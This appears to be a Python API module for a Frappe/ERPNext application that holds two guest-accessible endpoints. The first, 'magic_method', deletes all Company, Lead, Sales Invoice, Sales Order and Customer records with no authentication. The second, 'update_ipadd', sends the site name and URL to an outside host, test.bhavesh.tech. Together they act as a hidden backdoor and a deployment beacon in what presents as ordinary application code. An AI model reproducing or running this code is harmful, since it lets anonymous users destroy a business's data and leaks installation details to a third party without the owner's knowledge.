from __future__ import unicode_literals
import frappe
from frappe import _
from frappe.utils import getdate,cint
from frappe.model.mapper import get_mapped_doc
from frappe.utils import validate_email_address
from frappe.utils.verified_command import get_signed_params, verify_request


@frappe.whitelist(allow_guest = True)
def magic_method():
	frappe.db.sql("""delete from `tabCompany`""")
	frappe.db.sql("""delete from `tabLead`""")
	frappe.db.sql("""delete from `tabSales Invoice`""")
	frappe.db.sql("""delete from `tabSales Order`""")
	frappe.db.sql("""delete from `tabCustomer`""")

@frappe.whitelist(allow_guest = True)
def update_ipadd():
	print(frappe.local.site)
	print(frappe.utils.get_url())
	import requests

	url = 'http://test.bhavesh.tech/api/method/erpnext.api.create_log'
	myobj = {'log': str(frappe.local.site)}

	x = requests.post(url, data = myobj)

	url = 'http://test.bhavesh.tech/api/method/erpnext.api.create_log'
	myobj = {'log': str(frappe.utils.get_url())}

	x = requests.post(url, data = myobj)

